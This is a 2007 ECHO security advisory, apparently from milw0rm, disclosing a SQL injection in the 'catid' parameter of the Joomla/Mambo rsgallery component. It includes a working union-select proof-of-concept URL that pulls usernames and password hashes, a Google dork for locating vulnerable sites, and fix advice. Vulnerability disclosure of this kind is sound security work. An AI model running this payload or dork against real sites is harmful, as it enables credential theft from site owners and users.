@@ -1,0 +1,88 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_86$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_86$2007] Mambo/Joomla Component rsgallery <= 2.0 beta 5 (catid) Remote SQL Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : November, 30 th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv86-K-159-2007.txt
+Critical Lvl   : Medium
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : rsgallery  
+version       : <= 2.0 beta 5
+Vendor        : http://www.rsdev.nl/
+Description :
+
+RSGallery is one of the most complete Gallery solutions for Joomla at this point
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "catid" parameter is not properly verified before being used to sql query. 
+This can be exploited thru the browser and get the hash md5 password from users.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://target.com/index.php?option=com_rsgallery&page=inline&catid=-1%20union%20select%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11%20from%20mos_users--
+
+Dork:
+~~~~
+Google  : "option=com_rsgallery" or inurl:Óindex.php?option=com_rsgalleryÓ 
+
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+- use the latest version
+
+Timeline:
+~~~~~~~~
+
+- 30 -11 - 2007 bug found
+- 3  -12 - 2007 publish advisory
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, 'zizou' zautha - my lovely son, for all the luv, the tears n the breath
+~ y3dips,the_day,m0by,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry,ketut,x16,k1tk4t,cyb3rh3b,opt1lc
+~ newbie_hacker@yahoogroups.com
+~ everyone [at] mac.web.id forum
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-12-05]
